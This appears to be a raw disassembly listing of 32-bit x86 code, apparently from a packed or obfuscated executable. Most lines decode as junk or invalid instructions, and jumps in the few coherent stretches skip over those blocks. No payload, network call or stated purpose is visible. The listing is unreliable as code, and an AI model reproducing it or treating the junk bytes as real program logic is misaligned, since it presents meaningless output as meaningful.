  402107:	ret    0x7073
  40210a:	jns    0x402167
  40210c:	cmp    eax,0xd74d967d
  402111:	pop    ebx
  402112:	in     al,0xe3
  402114:	mov    ds:0xfeb7c2d,eax
  402119:	cmp    ebx,DWORD PTR [edx+0x6c6a1055]
  40211f:	bound  edi,QWORD PTR [edi+edx*1+0x7]
  402123:	call   0xd1f0c21a
  402128:	enter  0xda63,0xc6
  40212c:	mov    eax,DWORD PTR [ecx+ebx*1-0x3c819007]
  402133:	inc    ecx
  402134:	xlat   BYTE PTR ds:[ebx]
  402135:	outs   dx,DWORD PTR ds:[esi]
  402136:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  402138:	call   0x557a:0xceb566c7
  40213f:	arpl   cx,bx
  402141:	mov    dl,0x15
  402143:	sbb    eax,0xb0ed966d
  402148:	imul   edx,DWORD PTR [ecx+0x65],0xffffffbe
  40214c:	or     bl,BYTE PTR fs:[edx*1+0x65a425e5]
  402154:	sbb    DWORD PTR [edx-0x52],esp
  402157:	add    ecx,DWORD PTR [ebx]
  402159:	adc    dl,al
  40215b:	inc    ebx
  40215c:	cmp    ecx,DWORD PTR [esi+eiz*8]
  40215f:	mov    ebx,0x4060b3f
  402164:	jg     0x402177
  402166:	dec    esi
  402167:	mov    ecx,0xc81441d4
  40216d:	jp     0x4020f8
  40216f:	jno    0x40212f
  402171:	outs   dx,BYTE PTR ds:[esi]
  402172:	outs   dx,BYTE PTR ds:[esi]
  402173:	adc    al,0xf6
  402175:	jmp    FWORD PTR [ebp+0x302d221b]
  40217b:	ds es test eax,0x461bbd74
  402182:	daa    
  402183:	test   DWORD PTR [edi-0x3a],ecx
  402186:	fs mov ebp,0xd4220215
  40218c:	mov    al,ds:0xf956d27
  402191:	sub    DWORD PTR [eax],edx
  402193:	add    DWORD PTR [ecx+eax*1],esp
  402196:	stos   BYTE PTR es:[edi],al
  402197:	add    al,0x7d
  402199:	or     ebp,DWORD PTR [ebp+eiz*2-0x1468a1c4]
  4021a0:	fisub  WORD PTR [eax]
  4021a2:	adc    BYTE PTR [esi+0x23],bl
  4021a5:	aas    
  4021a6:	sahf   
  4021a7:	adc    esi,DWORD PTR [esi+0xf622f5d]
  4021ad:	xchg   ebp,eax
  4021ae:	les    esi,FWORD PTR [ebp+0x5b]
  4021b1:	call   0x6165c0f0
  4021b6:	jno    0x402190
  4021b8:	outs   dx,BYTE PTR ds:[esi]
  4021b9:	lods   al,BYTE PTR ds:[esi]
  4021ba:	push   0x4e7be34d
  4021bf:	jp     0x4021ad
  4021c1:	dec    ecx
  4021c2:	inc    eax
  4021c3:	and    DWORD PTR [ebx+0x61],0xffffffb1
  4021c7:	pop    esp
  4021c8:	popfw  
  4021ca:	mov    bh,0x37
  4021cc:	pop    esi
  4021cd:	xchg   ebp,eax
  4021ce:	sbb    al,BYTE PTR [ebp+0x4532fb01]
  4021d4:	pop    ecx
  4021d5:	sub    ebp,ecx
  4021d7:	repz aam 0x8f
  4021da:	scas   eax,DWORD PTR es:[edi]
  4021db:	stos   DWORD PTR es:[edi],eax
  4021dc:	shl    BYTE PTR ds:0x5946d7ed,0x13
  4021e3:	jmp    DWORD PTR [ecx-0x2bfed6fa]
  4021e9:	xchg   ecx,eax
  4021ea:	jge    0x4021f3
  4021ec:	mov    eax,0xa309d662
  4021f1:	cmp    eax,0xd55cd654
  4021f6:	and    cl,0x67
  4021f9:	fisttp DWORD PTR [edi+0x9]
  4021fc:	xchg   ebp,eax
  4021fd:	sar    BYTE PTR ss:[edx-0x54a020fc],cl
  402204:	fwait
  402205:	xchg   ebx,eax
  402206:	leave  
  402207:	dec    ebx
  402208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402209:	xor    al,0x5
  40220b:	sahf   
  40220c:	mov    esp,0x83c96a3c
  402211:	shl    BYTE PTR [edx+0x38],0xeb
  402215:	fidiv  DWORD PTR [edi+0x2a991841]
  40221b:	ds mov ecx,0x760a39b4
  402221:	loope  0x4021fc
  402223:	xor    DWORD PTR [edx*8+0x2f04e977],ecx
  40222a:	sar    BYTE PTR [ecx+0x48b214c9],0x88
  402231:	mov    cl,0xca
  402233:	cmc    
  402234:	inc    ecx
  402235:	inc    edi
  402236:	pop    ds
  402237:	ret    0x91a3
  40223a:	sub    DWORD PTR [ebx-0x63745ba],ecx
  402240:	mov    dh,0x14
  402242:	int3   
  402243:	inc    edx
  402244:	mov    al,0x7e
  402246:	jl     0x402235
  402248:	fwait
  402249:	nop
  40224a:	push   esp
  40224b:	outs   dx,DWORD PTR ds:[esi]
  40224c:	aaa    
  40224d:	xchg   ebp,eax
  40224e:	je     0x402212
  402250:	loope  0x402204
  402252:	mov    bl,ah
  402254:	sub    DWORD PTR [ecx-0x33f5c646],edx
  40225a:	iret   
  40225b:	xchg   esi,eax
  40225c:	add    edi,eax
  40225e:	arpl   bp,ax
  402260:	dec    edi
  402261:	jmp    0x402253
  402263:	clc    
  402264:	outs   dx,DWORD PTR ds:[esi]
  402265:	cmp    DWORD PTR [eax+0x2e],edi
  402268:	xchg   esp,eax
  402269:	and    al,0x10
  40226b:	dec    edx
  40226c:	jg     0x402225
  40226e:	pop    eax
  40226f:	and    BYTE PTR [edx-0x21],0x66
  402273:	es sbb edi,edi
  402276:	nop
  402277:	sbb    esi,0x5a
  40227a:	sbb    ecx,DWORD PTR [esp+ebp*1-0x7d3b368f]
  402281:	jecxz  0x4022b1
  402283:	mov    esi,0x590e8689
  402288:	gs sub ebx,esi
  40228b:	gs or  al,0xa6
  40228e:	dec    edi
  40228f:	jns    0x402276
  402291:	sub    al,0x3
  402293:	and    eax,0xce108ca3
  402298:	pop    esp
  402299:	pop    ecx
  40229a:	outs   dx,DWORD PTR ds:[esi]
  40229b:	add    al,0x1a
  40229d:	rol    edx,1
  40229f:	push   ss
  4022a0:	push   0x52806c15
  4022a5:	mov    ds:0x1898266c,eax
  4022aa:	and    eax,0x417656bf
  4022af:	ret    0x7689
  4022b2:	mov    edi,0x9c3c26f6
  4022b7:	pop    esp
  4022b8:	pop    ds
  4022b9:	or     al,0x7a
  4022bb:	pop    ds
  4022bc:	cmp    DWORD PTR [esi],ecx
  4022be:	test   bl,ah
  4022c0:	sub    esp,edx
  4022c2:	fidivr WORD PTR [eax]
  4022c4:	in     eax,dx
  4022c5:	xor    BYTE PTR [esi+0x6b],ch
  4022c8:	sub    ebp,esp
  4022ca:	sub    edi,edx
  4022cc:	or     eax,DWORD PTR [esi]
  4022ce:	dec    esi
  4022cf:	mov    ebx,0x4b00d17c
  4022d4:	(bad)  
  4022d6:	jmp    0x1f4a:0xe6529656
  4022dd:	sub    eax,0xaed705a
  4022e2:	div    BYTE PTR [ebx]
  4022e4:	sbb    ecx,ebx
  4022e6:	push   ss
  4022e7:	add    bl,dl
  4022e9:	jmp    0x4022b7
  4022eb:	push   0xcc68e55b
  4022f0:	loopne 0x40227d
  4022f2:	jp     0x4022db
  4022f4:	pop    edx
  4022f5:	fist   DWORD PTR [ebp+0x21]
  4022f8:	cs mov dl,0x63
  4022fb:	adc    DWORD PTR [edi],ebx
  4022fd:	mov    ebx,0x3196c4d
  402302:	add    bh,al
  402304:	or     edi,edi
  402306:	sub    DWORD PTR [ebp+0x2e],edi
  402309:	push   edx
  40230a:	imul   ebx,DWORD PTR [ecx+0x3ae29b16],0xa8618e98
  402314:	or     ch,ah
  402316:	pop    ecx
  402317:	xor    eax,0xc8633d5e
  40231c:	jbe    0x4022df
  40231e:	adc    esi,DWORD PTR [ebx+eax*2]
  402321:	mov    edx,0xce8b1e24
  402326:	mov    ebx,DWORD PTR [ecx-0xf]
  402329:	nop
  40232a:	sbb    ebx,ebp
  40232c:	cmp    esi,DWORD PTR [edx]
  40232e:	ds pop ebx
  402330:	iret   
  402331:	stc    
  402332:	sar    BYTE PTR [ebx],1
  402334:	outs   dx,BYTE PTR ds:[esi]
  402335:	gs inc esi
  402337:	and    cl,ch
  402339:	retf   
  40233a:	cli    
  40233b:	inc    esi
  40233c:	jns    0x402386
  40233e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40233f:	pusha  
  402340:	mov    ah,bh
  402342:	and    ah,BYTE PTR [ebp-0x42079dde]
  402348:	imul   esp,DWORD PTR [ecx+0x74dd7f19],0xd
  40234f:	mov    ds:0x1d446adf,eax
  402354:	shl    BYTE PTR ds:[eax-0x7a72ad6c],cl
  40235b:	push   0x43ffffff
  402360:	mov    DWORD PTR [ebp-0x8],eax
  402363:	mov    eax,DWORD PTR [ebp-0x10]
  402366:	xor    DWORD PTR ds:0x433717,ecx
  40236c:	mov    DWORD PTR [ebp-0x24],eax
  40236f:	not    ebx
  402371:	mov    eax,DWORD PTR [ebp-0x1c]
  402374:	or     ebx,DWORD PTR ds:0x4337fb
  40237a:	mov    DWORD PTR [ebp-0x20],eax
  40237d:	and    eax,ebx
  40237f:	mov    ebx,0xf89c853d
  402384:	mov    DWORD PTR [ebp-0x50],ebx
  402387:	mov    eax,DWORD PTR [ebp-0x50]
  40238a:	and    DWORD PTR ds:0x43377b,0x0
  402394:	jmp    0x4023a6
  402399:	mov    ecx,DWORD PTR ds:0x43377b
  40239f:	inc    ecx
  4023a0:	mov    DWORD PTR ds:0x43377b,ecx
  4023a6:	cmp    DWORD PTR ds:0x43377b,0x11
  4023ad:	jae    0x4023dd
  4023b3:	cmp    DWORD PTR ds:0x43377b,0x1b
  4023ba:	jne    0x4023cb
  4023c0:	push   0x4337bf
  4023c5:	call   DWORD PTR ds:0x4121bc
  4023cb:	jmp    0x402399
  4023d0:	movzx  ecx,WORD PTR ds:0x4337f7
  4023d7:	or     DWORD PTR ds:0x433767,ecx
  4023dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4023e0:	xor    eax,esi
  4023e2:	add    eax,edi
  4023e4:	or     DWORD PTR ds:0x433777,0x43383f
  4023ee:	mov    DWORD PTR [ecx],eax
  4023f0:	mov    eax,DWORD PTR [ebp-0x24]
  4023f3:	and    DWORD PTR ds:0x43376f,0x0
  4023fd:	mov    ecx,DWORD PTR ds:0x43376f
  402403:	inc    ecx
  402404:	mov    DWORD PTR ds:0x43376f,ecx
  40240a:	cmp    DWORD PTR ds:0x43376f,0x5
  402411:	jne    0x402436
  402417:	push   DWORD PTR [ebp-0x14]
  40241a:	push   DWORD PTR [ebp-0x18]
  40241d:	push   DWORD PTR [ebp-0x24]
  402420:	push   DWORD PTR [ebp-0x20]
  402423:	push   0x40e6
  402428:	push   0x433910
  40242d:	push   DWORD PTR [ebp-0x10]
  402430:	call   DWORD PTR ds:0x412354
  402436:	cmp    DWORD PTR ds:0x43376f,0x4
  40243d:	jne    0x402450
  402443:	mov    ecx,DWORD PTR ds:0x43376f
  402449:	inc    ecx
  40244a:	mov    DWORD PTR ds:0x43376f,ecx
  402450:	cmp    DWORD PTR ds:0x43376f,0x1d
  402457:	jb     0x4023fd
  40245d:	mov    ecx,DWORD PTR [ebp-0x8]
  402460:	xor    eax,esi
  402462:	add    eax,edi
  402464:	mov    DWORD PTR [ecx+0x4],eax
  402467:	mov    eax,DWORD PTR [ebp-0x2c]
  40246a:	mov    ecx,DWORD PTR [ebp-0x8]
  40246d:	jmp    0x40287b
  402472:	ror    BYTE PTR [ecx-0x3a],cl
  402475:	dec    esi
  402476:	inc    ebp
  402477:	push   ecx
  402478:	push   edx
  402479:	push   ecx
  40247a:	sbb    esp,DWORD PTR [edx-0x30e75390]
  402480:	sbb    eax,0x7e01ba61
  402485:	jle    0x4024f6
  402487:	jge    0x402507
  402489:	jle    0x40248b
  40248b:	push   ebp
  40248c:	sahf   
  40248d:	scas   eax,DWORD PTR es:[edi]
  40248e:	les    edx,FWORD PTR [ecx]
  402490:	mov    eax,0x65d5e197
  402495:	dec    edx
  402496:	adc    DWORD PTR [edi-0x46328f2a],esi
  40249c:	stos   BYTE PTR es:[edi],al
  40249d:	inc    edi
  40249e:	lods   al,BYTE PTR ds:[esi]
  40249f:	or     bh,BYTE PTR [ecx-0x6acee589]
  4024a5:	adc    eax,DWORD PTR [ecx-0x19]
  4024a8:	(bad)  
  4024a9:	cmp    dh,dl
  4024ab:	or     ah,BYTE PTR [edi+0x7e]
  4024ae:	gs sub cl,bh
  4024b1:	xor    DWORD PTR [ebx],edi
  4024b3:	out    0x60,eax
  4024b5:	arpl   WORD PTR [edx-0xc7735bb],si
  4024bb:	and    al,cl
  4024bd:	(bad)  
  4024be:	push   0xa176a0ca
  4024c3:	sub    al,0x21
  4024c5:	inc    eax
  4024c6:	inc    esi
  4024c7:	pop    esp
  4024c8:	sub    DWORD PTR [esi+0xd],0xffffffca
  4024cc:	pop    eax
  4024cd:	pop    ebx
  4024ce:	out    0xd7,al
  4024d0:	cmp    BYTE PTR [ebp+0x4e755ed6],dh
  4024d6:	dec    edx
  4024d7:	mov    dh,0x9d
  4024d9:	lds    ebp,FWORD PTR [esi-0x3b548229]
  4024df:	call   esp
  4024e1:	sub    ax,0x5d8e
  4024e5:	ds clc 
  4024e7:	mov    dl,BYTE PTR [esp+ecx*8-0x3d]
  4024eb:	call   0xa84b:0x7547d444
  4024f2:	xor    cl,BYTE PTR [edx]
  4024f4:	stos   DWORD PTR es:[edi],eax
  4024f5:	adc    esp,DWORD PTR [edx]
  4024f7:	dec    ebp
  4024f8:	add    esi,edi
  4024fa:	ss out dx,eax
  4024fc:	vmread DWORD PTR [eax],ecx
  4024ff:	ss rol bh,1
  402502:	xor    bh,bh
  402504:	mov    WORD PTR ds:0x7f9e13b6,?
  40250a:	pop    ecx
  40250b:	inc    ebx
  40250c:	and    al,BYTE PTR [esi-0x66713013]
  402512:	mov    al,ds:0x6c076cab
  402517:	test   al,0xee
  402519:	cdq    
  40251a:	int    0xd
  40251c:	int    0x38
  40251e:	ficom  DWORD PTR [eax+0x7f8d85f4]
  402524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402525:	call   0xec62f43a
  40252a:	out    0x83,al
  40252c:	popa   
  40252d:	cli    
  40252e:	pop    ebp
  40252f:	out    0x35,eax
  402531:	xchg   edx,eax
  402532:	mov    dh,0x9e
  402534:	out    dx,al
  402535:	int    0x16
  402537:	mov    ch,0x54
  402539:	outs   dx,DWORD PTR ds:[esi]
  40253a:	mov    dh,0xb9
  40253c:	(bad)  
  40253d:	jnp    0x402513
  40253f:	sahf   
  402540:	mov    ebp,0x5fc83ee
  402545:	repz add eax,0xe5a7b52b
  40254b:	cli    
  40254c:	aas    
  40254d:	dec    ecx
  40254e:	out    0xb2,eax
  402550:	mov    WORD PTR [ebp+edx*4-0x17aa4548],ss
  402557:	not    DWORD PTR [ebx-0x4acbc76d]
  40255d:	push   es
  40255e:	imul   ecx,DWORD PTR [eax],0x3b
  402561:	cld    
  402562:	test   ah,cl
  402564:	mov    ds:0xffc4304d,al
  402569:	int3   
  40256a:	cmp    DWORD PTR [ebx-0x7496f1ed],ecx
  402570:	ret    0xc1f0
  402573:	xor    eax,0x91fe4211
  402578:	mov    WORD PTR [ebx-0x5b83ff90],fs
  40257e:	lahf   
  40257f:	cdq    
  402580:	xchg   edx,eax
  402581:	dec    ebx
  402582:	js     0x4025d6
  402584:	add    eax,0xec6fed3d
  402589:	stos   DWORD PTR es:[edi],eax
  40258a:	or     al,BYTE PTR [edx-0x9]
  40258d:	dec    esi
  40258e:	clc    
  40258f:	out    dx,al
  402590:	push   ss
  402591:	ins    DWORD PTR es:[edi],dx
  402592:	mov    al,ds:0x41b33c42
  402597:	fld    DWORD PTR [eax-0x263a0e58]
  40259d:	fbstp  TBYTE PTR [ebx+0x48]
  4025a0:	or     DWORD PTR [edx],ecx
  4025a2:	pushf  
  4025a3:	cmc    
  4025a4:	sub    al,dh
  4025a6:	or     al,0xe9
  4025a8:	cmp    bh,BYTE PTR [eax+0x4732ea99]
  4025ae:	mov    dl,0x6
  4025b0:	jno    0x4025e7
  4025b2:	sub    BYTE PTR [ebp+0x47f46394],ah
  4025b8:	loop   0x402628
  4025ba:	es aam 0xa9
  4025bd:	mov    ch,0x8d
  4025bf:	ins    DWORD PTR es:[edi],dx
  4025c0:	(bad)
  4025c4:	sbb    eax,0x1a
  4025c7:	call   0x8596:0x831e3855
  4025ce:	sbb    BYTE PTR [eax+eiz*4-0x75],dl
  4025d2:	jno    0x402597
  4025d4:	ins    BYTE PTR es:[edi],dx
  4025d5:	xor    DWORD PTR [ebx+0x64],eax
  4025d8:	add    eax,0xe2ff1770
  4025dd:	ret    0x6066
  4025e0:	leave  
  4025e1:	hlt    
  4025e2:	sub    edi,DWORD PTR [eax]
  4025e4:	loopne 0x402596
  4025e6:	les    ebp,FWORD PTR [ecx+0x43]
  4025e9:	adc    eax,0x1540b223
  4025ee:	mov    eax,ebx
  4025f0:	ds dec edi
  4025f2:	mov    al,ds:0xac153706
  4025f7:	jle    0x4025f0
  4025f9:	cmp    eax,0x8164a4a9
  4025fe:	div    BYTE PTR [ebp-0x78ed6621]
  402604:	sbb    eax,0x5c3b1fc3
  402609:	fs pop ebp
  40260b:	lds    ebx,FWORD PTR [esi-0x6c2589ad]
  402611:	lock test eax,0xe132eceb
  402617:	jl     0x40263b
  402619:	jbe    0x40260c
  40261b:	sub    DWORD PTR [edx+0x3a],0xffffff9f
  40261f:	push   eax
  402620:	shl    ch,1
  402622:	fwait
  402623:	jp     0x40264e
  402625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402626:	sub    eax,0xf62f23
  40262b:	fistp  QWORD PTR es:[edi]
  40262e:	sbb    esi,esp
  402630:	xor    eax,0x191d5e44
  402635:	inc    eax
  402636:	pop    eax
  402637:	cdq    
  402638:	sbb    al,0x36
  40263a:	int3   
  40263b:	push   edi
  40263c:	jp     0x4025bf
  40263e:	or     BYTE PTR [edi-0x4dfe6075],al
  402644:	push   cs
  402645:	or     DWORD PTR [ebp-0x1bff8991],0x5e
  40264c:	jp     0x4026aa
  40264e:	dec    ebx
  40264f:	xlat   BYTE PTR ds:[ebx]
  402650:	les    ebp,FWORD PTR [esi+0x20]
  402653:	lea    edx,ds:0x2895760a
  402659:	out    dx,al
  40265a:	adc    eax,0x693f8afd
  40265f:	pop    ebp
  402660:	push   esi
  402661:	jmp    DWORD PTR [esi+ebp*2-0x37e8f39]
  402668:	pop    esp
  402669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40266a:	in     eax,0x6b
  40266c:	out    dx,eax
  40266d:	jne    0x4026d7
  40266f:	cwde   
  402670:	push   0x165d6ce5
  402675:	pushf  
  402676:	outs   dx,DWORD PTR ds:[esi]
  402677:	mov    ds:0xfb257572,al
  40267c:	int    0xa9
  40267e:	jecxz  0x4026d1
  402680:	repz push edx
  402682:	add    bh,BYTE PTR [edx-0x7c15c665]
  402688:	and    BYTE PTR [eax+0x5c],bl
  40268b:	int    0x5f
  40268d:	inc    esi
  40268e:	mov    edi,0x36ffbb4e
  402693:	lods   al,BYTE PTR ds:[esi]
  402694:	adc    eax,DWORD PTR [eax+0x4c]
  402697:	cmp    BYTE PTR [ebp-0x3b],cl
  40269a:	or     ebx,edi
  40269c:	outs   dx,BYTE PTR ds:[esi]
  40269d:	fidiv  DWORD PTR [esi+0x575cd3ec]
  4026a3:	xor    al,0xd8
  4026a5:	test   BYTE PTR ds:0x3488a0bf,bh
  4026ab:	lea    ebp,[ecx+0x4925db7c]
  4026b1:	jmp    0x402732
  4026b3:	cmp    DWORD PTR [ecx],edi
  4026b5:	push   0xe1f00d71
  4026ba:	sahf   
  4026bb:	sahf   
  4026bc:	adc    DWORD PTR [edx+0x7372383],eax
  4026c2:	rcl    BYTE PTR [esi+0x2676dd7f],cl
  4026c8:	push   eax
  4026c9:	sbb    BYTE PTR [edi-0x2b],dl
  4026cc:	adc    dh,dh
  4026ce:	inc    esp
  4026cf:	sbb    al,BYTE PTR [eax]
  4026d1:	xlat   BYTE PTR ds:[ebx]
  4026d2:	pop    DWORD PTR [ecx+edx*1-0x146d0b31]
  4026d9:	addr16 repz enter 0x1eaf,0x96
  4026df:	adc    BYTE PTR [edx-0x254aa2dc],bl
  4026e5:	enter  0xeb4f,0x9b
  4026e9:	or     ah,BYTE PTR [edi+eiz*2-0x20]
  4026ed:	sub    edx,DWORD PTR [ebx]
  4026ef:	xchg   edi,eax
  4026f0:	adc    DWORD PTR [ecx],ebx
  4026f2:	repnz ins DWORD PTR es:[edi],dx
  4026f4:	fld    TBYTE PTR [edi+0x4a]
  4026f7:	sub    al,BYTE PTR [eax]
  4026f9:	push   edi
  4026fa:	pop    ecx
  4026fb:	cwde   
  4026fc:	dec    ecx
  4026fd:	stos   DWORD PTR es:[edi],eax
  4026fe:	mov    ecx,0x5006aff2
  402703:	pop    ds
  402704:	push   0x1880ceec
  402709:	mov    esi,0xe0b536c1
  40270e:	std    
  40270f:	mov    esp,0x364d4280
  402714:	out    dx,eax
  402715:	xchg   edi,eax
  402716:	sti    
  402717:	push   ebx
  402718:	call   0xa82:0x339594dd
  40271f:	stos   DWORD PTR es:[edi],eax
  402720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402721:	pusha  
  402722:	mov    ecx,DWORD PTR [ebx+0x39]
  402725:	icebp  
  402726:	inc    ebp
  402727:	mov    ecx,0x6add8169
  40272c:	add    eax,0x7f807cc9
  402731:	jno    0x402749
  402733:	ficom  DWORD PTR [edx]
  402735:	test   eax,0x5065edb8
  40273a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40273b:	push   ecx
  40273c:	add    ecx,edx
  40273e:	inc    esp
  40273f:	int3   
  402740:	adc    al,BYTE PTR [eax]
  402742:	cmp    BYTE PTR [ebx-0x56],cl
  402745:	out    0x34,al
  402747:	sar    DWORD PTR [ecx-0x1af90c33],0xa3
  40274e:	or     eax,0xb7e3cea0
  402753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402754:	jae    0x40271a
  402756:	sub    BYTE PTR [edx+0x64017e01],cl
  40275c:	jle    0x402700
  40275e:	mov    ds:0x7b4770ef,al
  402763:	outs   dx,BYTE PTR ds:[esi]
  402764:	cdq    
  402765:	fisubr WORD PTR [ecx+0x47393181]
  40276b:	jl     0x402749
  40276d:	fistp  QWORD PTR [edx+ebp*1+0x47]
  402771:	ins    DWORD PTR es:[edi],dx
  402772:	bound  ebp,QWORD PTR [ecx+0xb]
  402775:	aaa    
  402776:	mov    esp,DWORD PTR [esi+0x43]
  402779:	(bad)  
  40277a:	fiadd  DWORD PTR [edi]
  40277c:	(bad)  
  40277d:	cmp    DWORD PTR [edi-0x39],edi
  402780:	add    DWORD PTR [ebx],edi
  402782:	outs   dx,BYTE PTR ds:[esi]
  402783:	jle    0x4027d2
  402785:	repnz sbb dh,BYTE PTR [ecx]
  402788:	push   ecx
  402789:	add    al,0x58
  40278b:	std    
  40278c:	fdiv   QWORD PTR [edi+0x5d4928ed]
  402792:	aas    
  402793:	xor    ah,dh
  402795:	unpcklps xmm4,XMMWORD PTR [edx+0x355e5ea0]
  40279c:	es (bad) 
  40279e:	jmp    0x86a3:0x78a09f94
  4027a5:	adc    cl,BYTE PTR [ebx+0x74]
  4027a8:	cli    
  4027a9:	(bad)  
  4027aa:	data16 es (bad) 
  4027ad:	mov    edx,0xb19bc407
  4027b2:	jecxz  0x4027b6
  4027b4:	xor    edx,DWORD PTR [ebx+ebp*2]
  4027b7:	and    esp,DWORD PTR [esi+0x60]
  4027ba:	test   ch,bl
  4027bc:	or     dl,ah
  4027be:	cmp    dl,ch
  4027c0:	call   0xada19cb8
  4027c5:	sbb    cl,0xb2
  4027c8:	push   ds
  4027c9:	pop    eax
  4027ca:	jmp    0xeddb:0x8fdbde13
  4027d1:	cmp    BYTE PTR [ecx-0x79],cl
  4027d4:	jb     0x402762
  4027d6:	sub    esi,edi
  4027d8:	sar    DWORD PTR [edi-0x72],1
  4027db:	adc    eax,0xe33d277d
  4027e0:	outs   dx,DWORD PTR ds:[esi]
  4027e1:	dec    ecx
  4027e2:	pop    ss
  4027e3:	aam    0xdf
  4027e5:	fisttp WORD PTR [ebp-0x5d9a923b]
  4027eb:	adc    al,0x7c
  4027ed:	sbb    DWORD PTR [edi+0x5f29fe90],esp
  4027f3:	sub    al,0xf
  4027f5:	div    DWORD PTR [ecx+0x4c999cba]
  4027fb:	add    edx,DWORD PTR [ecx-0x4a40bfc2]
  402801:	scas   eax,DWORD PTR es:[edi]
  402802:	fidivr DWORD PTR [esi]
  402804:	dec    esp
  402805:	xlat   BYTE PTR ds:[ebx]
  402806:	pusha  
  402807:	mov    ds:0xd01b1471,eax
  40280c:	mov    ebx,0xb8c4a099
  402811:	or     eax,DWORD PTR [edi+0x29a4a46f]
  402817:	cmc    
  402818:	(bad)  [ebx-0xa]
  40281b:	hlt    
  40281c:	cmp    al,0x82
  40281e:	xor    dl,BYTE PTR [eax]
  402820:	jne    0x4027be
  402822:	sar    BYTE PTR [esi+0xb4f2c4e],1
  402828:	mov    ds:0x102ae3a1,al
  40282d:	shl    BYTE PTR fs:[edx+0x8],1
  402831:	retf   
  402832:	shr    BYTE PTR [ebp-0x74],1
  402835:	fild   WORD PTR [eax]
  402837:	pop    esp
  402838:	ds adc eax,0x20adb4b2
  40283e:	retf   
  40283f:	mov    eax,ds:0x7289bc7a
  402844:	jns    0x4027ea
  402846:	pop    esi
  402847:	pushf  
  402848:	imul   esi,DWORD PTR [edx+0x6c280981],0x77
  40284f:	jg     0x40280b
  402851:	scas   eax,DWORD PTR es:[edi]
  402852:	dec    esi
  402853:	mov    eax,0x1d1b7080
  402858:	data16 xchg BYTE PTR [ebx+0x71],bl
  40285c:	inc    ebx
  40285d:	push   ss
  40285e:	rcl    bh,1
  402860:	xchg   esi,eax
  402861:	pop    edi
  402862:	loop   0x4027fa
  402864:	fs inc esi
  402866:	jae    0x40286f
  402868:	adc    BYTE PTR [eax+0x58],bh
  40286b:	mov    dh,0x8d
  40286d:	cmp    al,0x78
  40286f:	stc    
  402870:	sahf   
  402871:	dec    eax
  402872:	mov    eax,ds:0x28708beb
  402877:	push   esp
  402878:	fstp   TBYTE PTR [edx+0x3e]
  40287b:	mov    DWORD PTR [ecx+0x8],eax
  40287e:	mov    eax,DWORD PTR [ebp-0x30]
  402881:	mov    ecx,DWORD PTR [ebp-0x8]
  402884:	mov    DWORD PTR [ecx+0xc],eax
  402887:	mov    eax,DWORD PTR [ebp-0x34]
  40288a:	mov    ecx,DWORD PTR [ebp-0x8]
  40288d:	mov    DWORD PTR [ecx+0x10],eax
  402890:	mov    eax,eax
  402892:	mov    eax,DWORD PTR [ebp-0x20]
  402895:	xor    eax,esi
  402897:	add    eax,edi
  402899:	je     0x402cd8
  40289f:	lea    eax,[ebp-0x98]
  4028a5:	push   eax
  4028a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4028a9:	xor    eax,esi
  4028ab:	add    eax,edi
  4028ad:	push   eax
  4028ae:	mov    eax,DWORD PTR [ebp-0x18]
  4028b1:	jmp    0x402cbf
  4028b6:	xor    eax,DWORD PTR [ebx]
  4028b8:	mov    dl,0xa
  4028ba:	mov    dl,0xab
  4028bc:	mov    bl,0x23
  4028be:	sbb    al,0x86
  4028c0:	adc    al,BYTE PTR [ebx-0x1eb1688a]
  4028c6:	stos   DWORD PTR es:[edi],eax
  4028c7:	or     eax,0x7d6f7e7e
  4028cc:	jle    0x40294c
  4028ce:	mov    edx,0x7bd2169
  4028d3:	jp     0x402941
  4028d5:	jl     0x40290e
  4028d7:	es mov esi,0xe497af2d
  4028dd:	mov    edx,0x873fad0b
  4028e2:	dec    ebx
  4028e3:	into   
  4028e4:	call   0xd289:0x33ee9d32
  4028eb:	mov    esi,0x33520e9c
  4028f0:	call   0xbbf1:0x5774323d
  4028f7:	mov    cl,0xd
  4028f9:	cld    
  4028fa:	jns    0x4028b1
  4028fc:	push   edi
  4028fd:	jl     0x4028e0
  4028ff:	lds    ebp,FWORD PTR [edx]
  402901:	neg    BYTE PTR [eax]
  402903:	bound  eax,QWORD PTR [ecx]
  402905:	jge    0x402977
  402907:	xor    al,0x96
  402909:	mov    ecx,ebp
  40290b:	add    cl,dl
  40290d:	test   esi,0x51d95117
  402913:	frstor [esi+0x71]
  402916:	and    eax,DWORD PTR ds:0x14c678ea
  40291c:	mov    cl,BYTE PTR [ecx+eax*1+0x3b]
  402920:	pushf  
  402921:	icebp  
  402922:	ins    BYTE PTR es:[edi],dx
  402923:	cmc    
  402924:	dec    eax
  402925:	daa    
  402926:	not    DWORD PTR ds:0x4e01bf17
  40292c:	aad    0x22
  40292e:	inc    ebp
  40292f:	mov    esp,0x1d6b81a4
  402934:	xor    cl,BYTE PTR [esi+esi*2]
  402937:	loopne 0x40290b
  402939:	dec    eax
  40293a:	jne    0x402973
  40293c:	std    
  40293d:	pop    ecx
  40293e:	pop    ebx
  40293f:	fistp  QWORD PTR [ebx-0x78]
  402942:	push   0x54b1ca48
  402947:	and    BYTE PTR [esi-0x4898e990],bl
  40294d:	adc    al,al
  40294f:	(bad)  
  402950:	mov    dh,0x30
  402952:	mov    dh,0x90
  402954:	popa   
  402955:	xchg   esp,eax
  402956:	inc    esp
  402957:	sbb    ebx,DWORD PTR [eax+0x3]
  40295a:	jecxz  0x402969
  40295c:	adc    eax,0xd2eddacd
  402961:	jecxz  0x4029bf
  402963:	xor    BYTE PTR [eax+0xf],cl
  402966:	or     dh,ah
  402968:	cdq    
  402969:	push   0x40919311
  40296e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40296f:	add    eax,0x63c0e17b
  402974:	iret   
  402975:	(bad)  
  402976:	push   ebx
  402977:	arpl   WORD PTR [ecx-0x20],bx
  40297a:	add    al,0x22
  40297c:	push   ebp
  40297d:	shl    edi,1
